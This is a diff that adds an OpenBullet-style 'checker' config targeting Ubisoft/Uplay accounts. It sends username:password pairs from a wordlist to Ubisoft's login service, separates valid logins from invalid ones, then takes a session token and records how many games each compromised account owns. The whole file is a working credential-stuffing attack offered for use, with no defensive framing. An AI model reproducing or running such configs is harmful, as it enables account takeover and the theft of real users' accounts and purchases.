@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "PROXYLESS.Uplay",
+  "SuggestedBots": 10,
+  "LastModified": "2019-04-09T20:43:04.0586803+02:00",
+  "AdditionalInfo": "",
+  "Author": "NestleNutella",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "http://signupservice.ubi.com/PublicSignupService.svc" AutoRedirect=FALSE 
+  CONTENT "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"http://publicservice.ubi.com/publicservice/2011/05\"> <soapenv:Header/> <soapenv:Body>  <ns:LogIn>   <ns:genomeId>c72aa68b-ba70-4f4f-83c9-e0cc7728ac19</ns:genomeId>   <ns:userName><USER></ns:userName>   <ns:password><PASS></ns:password>  </ns:LogIn> </soapenv:Body></soapenv:Envelope>" 
+  CONTENTTYPE "text/xml;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "SOAPAction: http://publicservice.ubi.com/publicservice/2011/05/IPublicSignupService/LogIn" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "</a:AccountName>" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "</a:AccountName>" 
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "auth" 
+REQUEST POST "https://connect.ubi.com/ubiservices/v2/profiles/sessions" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "Ubi-AppId: 805319f5-950b-4490-9b3f-4e420df5084a" 
+  HEADER "Authorization: Basic <auth>" 
+PARSE "<SOURCE>" LR "userId\":\"" "\",\"username" -> VAR "profileid" 
+PARSE "<SOURCE>" LR "{\"token\":\"" "\",\"ticket" -> VAR "token" 
+REQUEST GET "https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/<profileid>/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Token: <token>" 
+PARSE "<SOURCE>" LR "TotalCount\":" "}" -> CAP "Total Games" 
